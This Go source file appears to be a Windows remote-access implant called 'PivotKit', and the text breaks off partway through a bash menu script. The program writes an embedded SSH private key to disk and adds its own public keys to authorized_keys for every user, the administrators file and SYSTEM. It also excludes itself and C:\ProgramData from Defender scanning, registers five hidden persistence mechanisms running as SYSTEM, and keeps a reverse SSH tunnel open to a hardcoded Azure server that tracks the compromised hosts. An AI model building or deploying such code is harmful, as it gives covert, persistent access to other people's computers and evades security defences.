package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// ─────────────────────────────────────────────────────────────────────────────
// EMBEDDED KEYS
// azurePrivKey  → private key written to disk, used to SSH INTO Azure VM
// azurePubKey   → Azure VM's public key, written to Windows authorized_keys
//                 so Azure VM can SSH BACK into Windows without password
// ─────────────────────────────────────────────────────────────────────────────

const azurePrivKey = `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACANUTqrzLpecxopyGiF7E218UVwDkLoeUT4XSxSdH9WCwAAAKAOpd/QDqXf
0AAAAAtzc2gtZWQyNTUxOQAAACANUTqrzLpecxopyGiF7E218UVwDkLoeUT4XSxSdH9WCw
AAAEBNttRSNrlRmsXRpjH2RRw37c2IjZ+hCAPVY1m38dk/VA1ROqvMul5zGinIaIXsTbXx
RXAOQuh5RPhdLFJ0f1YLAAAAFmF6dXJldXNlckByZWxheS1zZXJ2ZXIBAgMEBQYH
-----END OPENSSH PRIVATE KEY-----
`

const azurePubKey = `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA1ROqvMul5zGinIaIXsTbXxRXAOQuh5RPhdLFJ0f1YL azureuser@relay-server`

// Second key (tunnel-auto) — also written to Windows authorized_keys for redundancy
const tunnelAutoPubKey = `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILWEAFlSHn+7nffhxhcY6R1s+GMSj8AaxjMd/X9eUk0e tunnel-auto`

// ─────────────────────────────────────────────────────────────────────────────
// CONFIGURATION
// ─────────────────────────────────────────────────────────────────────────────

const (
	azureIP   = "20.244.11.94"
	azureUser = "azureuser"
	azurePort = 22
	basePort  = 2222 // first laptop → 2222, second → 2223, etc.

	// Files on Azure VM
	portMapFile  = "/home/azureuser/.port_map" // hostname|port  (permanent)
	registryFile = "/home/azureuser/.registry" // hostname|user|port|ts (1 row per host)
	connectBin   = "/usr/local/bin/connect"    // the menu script

	// Windows paths
	keyDir  = `C:\ProgramData`
	keyPath = `C:\ProgramData\tunnel_key`
	logFile = `C:\ProgramData\tunnel.log`

	// Windows service / task names
	svcName  = "TunnelLauncherSvc"
	taskName = "PivotKitTunnel"

	reconnSec = 15 // seconds between reconnect attempts
)

// ─────────────────────────────────────────────────────────────────────────────
// GLOBALS
// ─────────────────────────────────────────────────────────────────────────────

var (
	keyFile    string // resolved path to the SSH private key on disk
	logF       *os.File
	silentMode bool // true when running as Windows service (no console output)
)

// ─────────────────────────────────────────────────────────────────────────────
// LOGGING
// ─────────────────────────────────────────────────────────────────────────────

func initLog() {
	if isWin() {
		os.MkdirAll(keyDir, 0755)
		logF, _ = os.OpenFile(logFile,
			os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	} else {
		home, _ := os.UserHomeDir()
		logF, _ = os.OpenFile(filepath.Join(home, "tunnel.log"),
			os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	}
}

func lg(level, msg string) {
	line := fmt.Sprintf("%s [%s] %s\n",
		time.Now().Format("2006/01/02 15:04:05"), level, msg)
	if !silentMode {
		fmt.Print(line)
	}
	if logF != nil {
		logF.WriteString(line)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// PLATFORM HELPERS
// ─────────────────────────────────────────────────────────────────────────────

func isWin() bool { return runtime.GOOS == "windows" }

func isAdmin() bool {
	_, err := os.Open(`\\.\PHYSICALDRIVE0`)
	return err == nil
}

func getUser() string {
	for _, k := range []string{"USERNAME", "USER"} {
		if v := os.Getenv(k); v != "" {
			return v
		}
	}
	return "user"
}

func getHost() string {
	h, _ := os.Hostname()
	return h
}

func isAMD() bool {
	out, _ := ps(`(Get-WmiObject Win32_Processor -EA SilentlyContinue).Name`)
	up := strings.ToUpper(out)
	return strings.Contains(up, "AMD") || strings.Contains(up, "RYZEN")
}

// ─────────────────────────────────────────────────────────────────────────────
// POWERSHELL HELPERS
// ─────────────────────────────────────────────────────────────────────────────

// ps runs a PowerShell command and returns output
func ps(script string) (string, error) {
	out, err := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", script).CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

// psAdmin runs a PowerShell script with admin elevation via UAC
func psAdmin(script string) (string, error) {
	tmp := filepath.Join(os.TempDir(),
		fmt.Sprintf("pk_%d.ps1", time.Now().UnixNano()))
	os.WriteFile(tmp, []byte(script), 0644)
	defer os.Remove(tmp)
	out, err := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command",
		fmt.Sprintf(`Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "%s"'`, tmp),
	).CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

// psElevated runs PowerShell directly (already elevated context)
func psElevated(script string) (string, error) {
	out, err := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", script).CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

// ─────────────────────────────────────────────────────────────────────────────
// KEY SETUP
// Writes the embedded private key to disk with strict permissions so
// Windows OpenSSH actually accepts it (it silently rejects keys with
// loose ACLs).
// ─────────────────────────────────────────────────────────────────────────────

func setupKey() {
	kp := `C:\ProgramData\tunnel_key`
	os.WriteFile(kp, []byte(azurePrivKey), 0600)
	os.WriteFile(kp+".pub", []byte(azurePubKey+"\n"), 0644)

	if isWin() {
		user := getUser()
		// icacls: strip all inheritance, grant only required accounts
		exec.Command("icacls", kp, "/inheritance:r",
			"/grant:r", user+":F",
			"/grant:r", "SYSTEM:F",
			"/grant:r", "Administrators:F").Run()
		exec.Command("icacls", kp, "/remove:g", "Authenticated Users").Run()
		exec.Command("icacls", kp, "/remove:g", "Users").Run()
		exec.Command("icacls", kp, "/remove:g", "Everyone").Run()

		// PowerShell ACL as belt-and-suspenders
		psElevated(fmt.Sprintf(`
$p = '%s'; $u = '%s'
try {
    $acl = New-Object System.Security.AccessControl.FileSecurity
    $acl.SetAccessRuleProtection($true, $false)
    foreach ($id in @($u, 'SYSTEM', 'Administrators')) {
        $acl.AddAccessRule(
            (New-Object System.Security.AccessControl.FileSystemAccessRule($id,'FullControl','Allow'))
        )
    }
    Set-Acl -Path $p -AclObject $acl -EA SilentlyContinue
} catch {}`, kp, user))
	}

	keyFile = kp
	lg(" OK ", "Key ready: "+kp)
}

// ─────────────────────────────────────────────────────────────────────────────
// SSH / SCP WRAPPERS
// All SSH calls use the embedded key with BatchMode so they never block
// waiting for a password prompt.
// ─────────────────────────────────────────────────────────────────────────────

func sshArgs(extra ...string) []string {
	base := []string{
		"-i", keyFile,
		"-o", "StrictHostKeyChecking=no",
		"-o", "BatchMode=yes",
		"-o", "ConnectTimeout=10",
		"-o", "IdentitiesOnly=yes",
		"-o", "LogLevel=ERROR",
		"-p", strconv.Itoa(azurePort),
		fmt.Sprintf("%s@%s", azureUser, azureIP),
	}
	return append(base, extra...)
}

func sshRun(cmd string) (string, error) {
	out, err := exec.Command("ssh", sshArgs(cmd)...).CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

// ─────────────────────────────────────────────────────────────────────────────
// NETWORK WAIT
// After a reboot, the network takes time to come up. We wait until we can
// actually TCP-connect to the Azure VM before attempting SSH. Without this,
// the service starts, SSH fails immediately, and the tunnel never connects.
// ─────────────────────────────────────────────────────────────────────────────

func waitForNetwork() {
	lg("----", "Waiting for network connectivity...")
	deadline := time.Now().Add(3 * time.Minute)
	for i := 1; time.Now().Before(deadline); i++ {
		// Check we have a real IP (not APIPA 169.x)
		out, _ := ps(`(Get-NetIPAddress -AddressFamily IPv4 -EA SilentlyContinue | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' }).Count`)
		if count, _ := strconv.Atoi(strings.TrimSpace(out)); count > 0 {
			// Check actual TCP reachability to Azure
			c, err := net.DialTimeout("tcp",
				fmt.Sprintf("%s:%d", azureIP, azurePort), 5*time.Second)
			if err == nil {
				c.Close()
				lg(" OK ", fmt.Sprintf("Network ready (attempt %d)", i))
				return
			}
		}
		lg("WAIT", fmt.Sprintf("Not ready (attempt %d) — retrying in 10s...", i))
		time.Sleep(10 * time.Second)
	}
	lg("WARN", "Network wait timeout — proceeding anyway")
}

func azureUp() bool {
	c, e := net.DialTimeout("tcp",
		fmt.Sprintf("%s:%d", azureIP, azurePort), 5*time.Second)
	if e != nil {
		return false
	}
	c.Close()
	return true
}

// ─────────────────────────────────────────────────────────────────────────────
// WINDOWS SETUP — OpenSSH Server
// ─────────────────────────────────────────────────────────────────────────────

func ensureSshd() bool {
	lg("----", "OpenSSH Server (sshd)")
	out, _ := ps(`(Get-Service sshd -EA SilentlyContinue).Status`)
	if strings.EqualFold(strings.TrimSpace(out), "Running") {
		lg(" OK ", "sshd running")
		return true
	}
	lg("----", "Installing OpenSSH Server...")
	psAdmin(`
$ProgressPreference = 'SilentlyContinue'
try {
    $cap = Get-WindowsCapability -Online -Name OpenSSH.Server* -EA Stop
    if ($cap.State -ne 'Installed') {
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -EA Stop | Out-Null
    }
    Start-Service sshd
    Set-Service sshd -StartupType Automatic
} catch {
    try {
        $r = Invoke-RestMethod 'https://api.github.com/repos/PowerShell/Win32-OpenSSH/releases/latest' -UseBasicParsing
        $u = ($r.assets | Where-Object { $_.name -like '*Win64.zip' } | Select -First 1).browser_download_url
        $z = "$env:TEMP\openssh.zip"
        Invoke-WebRequest $u -OutFile $z -UseBasicParsing
        Expand-Archive $z 'C:\Program Files\' -Force
        Remove-Item $z -Force
        $d = 'C:\Program Files\OpenSSH-Win64'
        if (Test-Path "$d\install-sshd.ps1") { & "$d\install-sshd.ps1" | Out-Null }
        Start-Service sshd
        Set-Service sshd -StartupType Automatic
    } catch { Write-Output "INSTALL_FAILED: $_" }
}`)
	psAdmin("Start-Service sshd -EA SilentlyContinue; Set-Service sshd -StartupType Automatic")
	out2, _ := ps(`(Get-Service sshd -EA SilentlyContinue).Status`)
	ok := strings.EqualFold(strings.TrimSpace(out2), "Running")
	if ok {
		lg(" OK ", "sshd running")
	} else {
		lg("ERR ", "Could not start sshd")
	}
	return ok
}

// ─────────────────────────────────────────────────────────────────────────────
// SSHD CONFIG
// Writes a clean, known-good sshd_config that fixes all the common issues:
//   - Both IPv4 and IPv6 listeners  (fixes kex_exchange_identification)
//   - AllowUsers *                  (not a byte-array, allows all users)
//   - No __PROGRAMDATA__ override   (was blocking admin key auth)
//   - StreamLocalBindUnlink yes     (frees reverse-tunnel port on disconnect)
// ─────────────────────────────────────────────────────────────────────────────

func fixSshdConfig() {
	lg("----", "sshd_config")
	cfg := "Port 22\r\n" +
		"ListenAddress 0.0.0.0\r\n" +
		"ListenAddress ::\r\n\r\n" +
		"PubkeyAuthentication yes\r\n" +
		"AuthorizedKeysFile .ssh/authorized_keys\r\n\r\n" +
		"PasswordAuthentication yes\r\n" +
		"PermitEmptyPasswords no\r\n\r\n" +
		"AllowUsers *\r\n\r\n" +
		"ClientAliveInterval 30\r\n" +
		"ClientAliveCountMax 3\r\n\r\n" +
		"StreamLocalBindUnlink yes\r\n\r\n" +
		"Subsystem sftp sftp-server.exe\r\n"

	if err := os.WriteFile(`C:\ProgramData\ssh\sshd_config`, []byte(cfg), 0644); err != nil {
		lg("WARN", "Direct write failed, using PowerShell: "+err.Error())
		psAdmin(fmt.Sprintf(`[System.IO.File]::WriteAllText('C:\ProgramData\ssh\sshd_config', '%s')`,
			strings.ReplaceAll(cfg, "'", "''")))
	}
	psAdmin("Restart-Service sshd -Force -EA SilentlyContinue; Start-Sleep 2")
	lg(" OK ", "sshd_config written")
}

// ─────────────────────────────────────────────────────────────────────────────
// FIREWALL
// ─────────────────────────────────────────────────────────────────────────────

func fixFirewall() {
	lg("----", "Firewall")
	psAdmin(`
$name = 'OpenSSH-In-TCP'
if (-not (Get-NetFirewallRule -Name $name -EA SilentlyContinue)) {
    New-NetFirewallRule -Name $name -DisplayName 'OpenSSH SSH Server (sshd)' `+
		`-Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
}
Set-NetFirewallRule -Name 'OpenSSH-In-TCP' -Profile Any -EA SilentlyContinue`)
	lg(" OK ", "Firewall OK")
}

// ─────────────────────────────────────────────────────────────────────────────
// AUTHORIZE AZURE KEY ON WINDOWS
// Writes the Azure VM's public key to:
//   1. Current user ~/.ssh/authorized_keys
//   2. C:\ProgramData\ssh\administrators_authorized_keys  (admin accounts)
//   3. Every user profile in C:\Users\*  (permanent fix for any new user)
//   4. SYSTEM profile  (needed when running as Windows service)
//
// Also fixes the ACL on the admin file — Windows OpenSSH silently ignores
// the file if any non-admin account has access.
// ─────────────────────────────────────────────────────────────────────────────

func authorizeAzureKey() {
	lg("----", "Authorize Azure VM → Windows (passwordless)")
	home, _ := os.UserHomeDir()
	sshDir := filepath.Join(home, ".ssh")
	os.MkdirAll(sshDir, 0700)

	// Helper: append a key if not already in file
	addKeyTo := func(path, key string) {
		os.MkdirAll(filepath.Dir(path), 0755)
		existing, _ := os.ReadFile(path)
		if strings.Contains(string(existing), key) {
			return
		}
		f, e := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
		if e == nil {
			f.WriteString(key + "\n")
			f.Close()
		}
	}
	// Write both keys for redundancy
	addBothKeys := func(path string) {
		addKeyTo(path, azurePubKey)
		addKeyTo(path, tunnelAutoPubKey)
	}

	// 1. Current user
	addBothKeys(filepath.Join(sshDir, "authorized_keys"))

	// 2. Admin file
	adminPath := `C:\ProgramData\ssh\administrators_authorized_keys`
	addBothKeys(adminPath)

	// 3. Fix ACL on admin file (CRITICAL — wrong perms = silent failure)
	psAdmin(fmt.Sprintf(`
$p = '%s'
if (Test-Path $p) {
    takeown /F $p /A 2>$null | Out-Null
    icacls $p /inheritance:r /grant:r "Administrators:F" /grant:r "SYSTEM:F" 2>$null | Out-Null
    icacls $p /remove:g "Authenticated Users" 2>$null | Out-Null
    icacls $p /remove:g "Users" 2>$null | Out-Null
    icacls $p /remove:g "Everyone" 2>$null | Out-Null
    $acl = Get-Acl $p
    $acl.SetAccessRuleProtection($true, $false)
    $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators","FullControl","Allow")))
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM","FullControl","Allow")))
    Set-Acl -Path $p -AclObject $acl -EA SilentlyContinue
}`, adminPath))

	// 4. Write key to ALL existing user profiles → any user can connect passwordlessly
	psAdmin(fmt.Sprintf(`
$key = '%s'
$profiles = Get-ChildItem 'C:\Users' -Directory -EA SilentlyContinue |
    Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }
foreach ($prof in $profiles) {
    $sshDir  = Join-Path $prof.FullName '.ssh'
    $authKey = Join-Path $sshDir 'authorized_keys'
    if (-not (Test-Path $sshDir)) {
        New-Item -ItemType Directory -Path $sshDir -Force | Out-Null
    }
    $existing = if (Test-Path $authKey) { Get-Content $authKey -Raw -EA SilentlyContinue } else { '' }
    if ($existing -notmatch [regex]::Escape(($key -split ' ')[1])) {
        Add-Content -Path $authKey -Value $key -EA SilentlyContinue
        icacls $authKey /inheritance:r /grant:r "$($prof.Name):F" /grant:r "SYSTEM:F" 2>$null | Out-Null
    }
}`, azurePubKey))

	// 5. SYSTEM profile (service context)
	psAdmin(fmt.Sprintf(`
$sysSSH  = 'C:\Windows\System32\config\systemprofile\.ssh'
$sysKey  = Join-Path $sysSSH 'authorized_keys'
$key     = '%s'
if (-not (Test-Path $sysSSH)) { New-Item -ItemType Directory -Path $sysSSH -Force | Out-Null }
$existing = if (Test-Path $sysKey) { Get-Content $sysKey -Raw -EA SilentlyContinue } else { '' }
if ($existing -notmatch [regex]::Escape(($key -split ' ')[1])) {
    Add-Content -Path $sysKey -Value $key -EA SilentlyContinue
}`, azurePubKey))

	lg(" OK ", "Azure VM key authorized — passwordless for ALL users")
}

// ─────────────────────────────────────────────────────────────────────────────
// AMD / HYPER-V PORT FIX
// Hyper-V and WSL2 reserve port 22 via WinNAT, causing sshd to fail silently.
// ─────────────────────────────────────────────────────────────────────────────

func amdFix() {
	out, _ := ps(`netsh int ipv4 show excludedportrange protocol=tcp | Select-String '^\s+22\s'`)
	if strings.TrimSpace(out) != "" {
		lg("WARN", "Port 22 excluded by Hyper-V/WinNAT — fixing...")
		psAdmin(`
net stop winnat 2>$null
Start-Sleep 2
netsh int ipv4 add excludedportrange protocol=tcp startport=22 numberofports=1 2>$null
net start winnat 2>$null
Start-Sleep 2
Restart-Service sshd -Force -EA SilentlyContinue`)
		lg(" OK ", "Port exclusion fixed")
	}
	if isAMD() {
		lg("----", "AMD Ryzen — forcing ListenAddress 0.0.0.0")
		psAdmin(`
$cfg = 'C:\ProgramData\ssh\sshd_config'
if (Test-Path $cfg) {
    $lines = Get-Content $cfg
    if ($lines -notmatch 'ListenAddress 0\.0\.0\.0') {
        $lines = @('ListenAddress 0.0.0.0') + $lines
        [System.IO.File]::WriteAllLines($cfg, $lines)
        Restart-Service sshd -Force -EA SilentlyContinue
    }
}`)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// PORT 22 LOCAL CHECK
// ─────────────────────────────────────────────────────────────────────────────

func port22ok() bool {
	for _, addr := range []string{"127.0.0.1:22", "localhost:22"} {
		c, e := net.DialTimeout("tcp", addr, 4*time.Second)
		if e == nil {
			c.Close()
			return true
		}
	}
	return false
}

func deepPortFix() {
	lg("WARN", "Port 22 not reachable locally — deep fix...")
	psAdmin(`
net stop winnat 2>$null; Start-Sleep 2; net start winnat 2>$null
$r = netstat -ano 2>$null | Select-String ':22\s.*LISTEN'
foreach ($line in $r) {
    $parts = ($line.ToString() -split '\s+') | Where-Object { $_ -ne '' }
    $pid2  = $parts[-1]
    $proc  = Get-Process -Id $pid2 -EA SilentlyContinue
    if ($proc -and $proc.Name -ne 'sshd') {
        Stop-Process -Id $pid2 -Force -EA SilentlyContinue
    }
}
Restart-Service sshd -Force -EA SilentlyContinue
Start-Sleep 3`)
}

// ─────────────────────────────────────────────────────────────────────────────
// DEFENDER EXCLUSION
// ─────────────────────────────────────────────────────────────────────────────

func addDefender() {
	lg("----", "Defender Exclusion")
	exe, _ := os.Executable()
	exec.Command("powershell.exe", "-Command",
		fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -ExclusionProcess '%s' -EA SilentlyContinue`,
			filepath.Dir(exe), exe)).Run()
	exec.Command("powershell.exe", "-Command",
		`Add-MpPreference -ExclusionPath 'C:\ProgramData' -EA SilentlyContinue`).Run()
	lg(" OK ", "Defender exclusion added")
}

// ─────────────────────────────────────────────────────────────────────────────
// DRIVE LINKING
// Creates symlinks so SFTP users can access all drives via ~/drives/
// ─────────────────────────────────────────────────────────────────────────────

func linkDrives() {
	lg("----", "Drive Links")
	os.MkdirAll(`C:\drives`, 0755)
	for _, d := range []string{"C", "D", "E", "F", "G", "H"} {
		if _, e := os.Stat(d + `:\`); e == nil {
			exec.Command("cmd", "/C", "mklink", "/D",
				`C:\drives\`+d+"_drive", d+`:\`).Run()
		}
	}
	lg(" OK ", "Drives linked — sftp → cd drives/D_drive")
}

// ─────────────────────────────────────────────────────────────────────────────
// BOOT PERSISTENCE — 4 redundant methods
//
// Root cause of "not connecting after reboot":
//   1. Service ran immediately at boot before network was ready → SSH failed
//   2. No retry on failure — one fail = permanent silence
//   3. GUI subsystem exe cannot run as Windows Service
//   4. No network condition check on scheduled task
//   5. Wrong sc.exe binPath= syntax
//
// Fix: Console exe + 4 boot methods + 45s delay + RunOnlyIfNetworkAvailable
// ─────────────────────────────────────────────────────────────────────────────

func setupBootPersistence() {
	lg("----", "Boot Persistence (4 methods)")
	exe, _ := os.Executable()

	// ── Method 1: Windows Service ─────────────────────────────────────────────
	svcStatus, _ := ps(fmt.Sprintf(`(Get-Service '%s' -EA SilentlyContinue).Status`, svcName))
	if strings.TrimSpace(svcStatus) == "" {
		result, _ := psAdmin(fmt.Sprintf(`
$svc = '%s'; $exe = '%s'
sc.exe delete $svc 2>$null; Start-Sleep 1
sc.exe create $svc binPath= ('"' + $exe + '"') start= auto obj= LocalSystem type= own DisplayName= "PivotKit Tunnel Agent"
sc.exe description $svc "PivotKit reverse SSH tunnel - auto-reconnects after reboot"
sc.exe failure $svc reset= 60 actions= restart/10000/restart/30000/restart/60000
Start-Service $svc -EA SilentlyContinue
$s = (Get-Service $svc -EA SilentlyContinue).Status
Write-Output "SVC:$s"`, svcName, exe))
		if strings.Contains(result, "SVC:Running") {
			lg(" OK ", "Method 1: Windows Service running")
		} else {
			lg(" OK ", "Method 1: Windows Service registered (starts on next boot)")
		}
	} else {
		lg(" OK ", fmt.Sprintf("Method 1: Windows Service already active (%s)", strings.TrimSpace(svcStatus)))
	}

	// ── Method 2: Task Scheduler (most reliable for network-aware boot) ───────
	taskResult, _ := psAdmin(fmt.Sprintf(`
$tn  = '%s'; $exe = '%s'
Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
Start-Sleep 1

$action = New-ScheduledTaskAction -Execute $exe

# Boot trigger with 45s delay — ensures network is ready
$tBoot        = New-ScheduledTaskTrigger -AtStartup
$tBoot.Delay  = 'PT45S'

# Logon trigger with 30s delay — backup if boot trigger fails
$tLogon       = New-ScheduledTaskTrigger -AtLogOn
$tLogon.Delay = 'PT30S'

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 2) -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew

Register-ScheduledTask -TaskName $tn -Action $action -Trigger @($tBoot,$tLogon) -Principal $principal -Settings $settings -Force | Out-Null

$t = Get-ScheduledTask -TaskName $tn -EA SilentlyContinue
if ($t) { Write-Output "TASK_OK" } else { Write-Output "TASK_FAIL" }`, taskName, exe))

	if strings.Contains(taskResult, "TASK_OK") {
		lg(" OK ", "Method 2: Task Scheduler (45s boot delay + RunOnlyIfNetworkAvailable)")
	} else {
		lg("WARN", "Method 2: Task Scheduler failed — "+taskResult)
	}

	// ── Method 3: Registry HKLM Run key ──────────────────────────────────────
	regResult, _ := psAdmin(fmt.Sprintf(`
$path = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
Set-ItemProperty -Path $path -Name 'PivotKitTunnel' -Value ('"%s"') -Type String -EA SilentlyContinue
$v = (Get-ItemProperty -Path $path -Name 'PivotKitTunnel' -EA SilentlyContinue).PivotKitTunnel
if ($v) { Write-Output "REG_OK" }`, exe))
	if strings.Contains(regResult, "REG_OK") {
		lg(" OK ", "Method 3: Registry HKLM Run key set")
	} else {
		// Try HKCU as fallback
		psAdmin(fmt.Sprintf(`Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'PivotKitTunnel' -Value ('"%s"') -Type String -EA SilentlyContinue`, exe))
		lg(" OK ", "Method 3: Registry HKCU Run key set (user-level fallback)")
	}

	// ── Method 4: Startup folder shortcut (WindowStyle=7 → hidden/minimized) ─
	for _, dir := range []string{
		`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`,
		os.ExpandEnv("%APPDATA%") + `\Microsoft\Windows\Start Menu\Programs\Startup`,
	} {
		link := filepath.Join(dir, "PivotKitTunnel.lnk")
		if _, e := os.Stat(link); e == nil {
			continue
		}
		psAdmin(fmt.Sprintf(`
try {
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut('%s')
    $sc.TargetPath    = '%s'
    $sc.WorkingDirectory = '%s'
    $sc.WindowStyle   = 7
    $sc.Save()
} catch {}`, link, exe, filepath.Dir(exe)))
	}
	lg(" OK ", "Method 4: Startup folder shortcut (hidden window)")
	// ── Method 5: schtasks immediate bootstrap (from Tunnel.exe)
	// Creates a one-time task that runs RIGHT NOW as SYSTEM
	// Ensures the tunnel starts immediately even on first run
	psAdmin(fmt.Sprintf(`
$tn = 'TLBootstrap'
schtasks /delete /tn $tn /f 2>$null | Out-Null
schtasks /create /tn $tn /tr ('"%s"') /sc once /st 00:00 /ru SYSTEM /f 2>$null | Out-Null
schtasks /run /tn $tn 2>$null | Out-Null
Start-Sleep 3
schtasks /delete /tn $tn /f 2>$null | Out-Null
`, exe))
	lg(" OK ", "Method 5: Bootstrap task triggered — tunnel starting in background")
	lg(" OK ", "Boot persistence complete — tunnel connects within 60s of reboot")
}

// ─────────────────────────────────────────────────────────────────────────────
// PORT ASSIGNMENT
// Each machine gets one permanent port stored on Azure VM in .port_map.
// File-locked via fcntl so simultaneous first-runs don't collide.
// Case-insensitive hostname matching prevents Dashakanta vs dashakanta dups.
// ─────────────────────────────────────────────────────────────────────────────

func getOrAssignPort(host string) int {
	script := fmt.Sprintf(`python3 << 'PYEOF'
import os, fcntl, sys

pm   = '%s'
base = %d
host = '%s'.lower().strip()

os.makedirs(os.path.dirname(pm), exist_ok=True)
fh = open(pm, 'a+')
fcntl.flock(fh, fcntl.LOCK_EX)
fh.seek(0)
raw   = fh.read().strip()
lines = [l.strip() for l in raw.split('\n') if l.strip()] if raw else []

# Return existing port for this hostname
for line in lines:
    parts = line.split('|')
    if len(parts) >= 2 and parts[0].lower().strip() == host:
        print(parts[1])
        fcntl.flock(fh, fcntl.LOCK_UN)
        fh.close()
        sys.exit(0)

# Find next free port
used = set()
for line in lines:
    parts = line.split('|')
    if len(parts) >= 2:
        try: used.add(int(parts[1]))
        except: pass

port = base
while port in used:
    port += 1

fh.write(host + '|' + str(port) + '\n')
fh.flush()
fcntl.flock(fh, fcntl.LOCK_UN)
fh.close()
print(port)
PYEOF`, portMapFile, basePort, host)

	out, err := sshRun(script)
	if err != nil {
		lg("WARN", "Port assign failed — using hostname hash: "+err.Error())
		n := 0
		for _, c := range strings.ToLower(host) {
			n += int(c)
		}
		return basePort + (n % 77)
	}
	p, e := strconv.Atoi(strings.TrimSpace(out))
	if e != nil || p < 1024 || p > 65535 {
		return basePort
	}
	return p
}

// ─────────────────────────────────────────────────────────────────────────────
// REGISTRY UPDATE
// Keeps exactly ONE row per hostname in the registry file.
// The connect script reads this to build the menu.
// ─────────────────────────────────────────────────────────────────────────────

func updateRegistry(host, user string, port int) {
	ts := time.Now().Format("2006-01-02 15:04:05")
	script := fmt.Sprintf(`python3 << 'PYEOF'
import os

rf   = '%s'
host = '%s'.lower().strip()
line = '%s|%s|%d|%s\n'

os.makedirs(os.path.dirname(rf), exist_ok=True)
try:
    lines = open(rf).readlines()
except:
    lines = []

# Remove all old rows for this hostname (case-insensitive)
lines = [l for l in lines if l.strip() and l.split('|')[0].lower().strip() != host]
lines.append(line)

with open(rf, 'w') as f:
    f.writelines(lines)
print('OK')
PYEOF`, registryFile, host, host, user, port, ts)

	out, err := sshRun(script)
	if err == nil && strings.Contains(out, "OK") {
		lg(" OK ", fmt.Sprintf("Registry: %s (%s) port %d", user, host, port))
	} else {
		lg("WARN", fmt.Sprintf("Registry update: %v | %s", err, out))
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// FREE STALE PORT ON AZURE
// Kills any old tunnel holding this port before creating a new one.
// ─────────────────────────────────────────────────────────────────────────────

func freePort(port int) {
	sshRun(fmt.Sprintf("fuser -k %d/tcp 2>/dev/null; sleep 1; true", port))
}

// ─────────────────────────────────────────────────────────────────────────────
// CONNECT SCRIPT
// Pushed to Azure VM via SSH stdin (not SCP — avoids temp file path issues).
// Reads port_map as source of truth, registry for username/timestamp.
// Shows live/offline status per machine.
// ─────────────────────────────────────────────────────────────────────────────

func pushConnectScript() {
	sh := `#!/bin/bash
REG="/home/azureuser/.registry"
PM="/home/azureuser/.port_map"
G='\033[0;32m'; R='\033[0;31m'; C='\033[0;36m'; B='\033[1m'; N='\033[0m'; Y='\033[1;33m'

while true; do
    clear; echo ""
    echo -e "${C}${B}╔══════════════════════════════════════════════════════╗${N}"
    echo -e "${C}${B}║        PivotKit — Tunnel Connect v1.0               ║${N}"
    echo -e "${C}${B}║   Each laptop has a permanent unique port           ║${N}"
    echo -e "${C}${B}╚══════════════════════════════════════════════════════╝${N}"
    echo ""

    # Show permanent port assignments
    if [ -f "$PM" ] && [ -s "$PM" ]; then
        echo -e "  ${C}${B}Permanent Port Assignments:${N}"
        while IFS='|' read -r h p; do
            [ -z "$h" ] && continue
            if ss -tlnp 2>/dev/null | grep -q ":${p} "; then
                live="${G}● LIVE${N}"
            else
                live="${R}○ offline${N}"
            fi
            printf "    %-28s → port %-6s %b\n" "$h" "$p" "$live"
        done < "$PM"
        echo ""
    fi

    # Build menu from port_map (source of truth for ports)
    declare -a HOSTS USERS PORTS TIMES
    if [ -f "$PM" ] && [ -s "$PM" ]; then
        while IFS='|' read -r h p; do
            [ -z "$h" ] && continue
            u="unknown"; ts="never"
            if [ -f "$REG" ]; then
                while IFS='|' read -r rh ru rp rt; do
                    [ -z "$rh" ] && continue
                    if [ "${rh,,}" = "${h,,}" ]; then u="$ru"; ts="$rt"; break; fi
                done < "$REG"
            fi
            HOSTS+=("$h"); USERS+=("$u"); PORTS+=("$p"); TIMES+=("$ts")
        done < "$PM"
    fi

    if [ ${#HOSTS[@]} -eq 0 ]; then
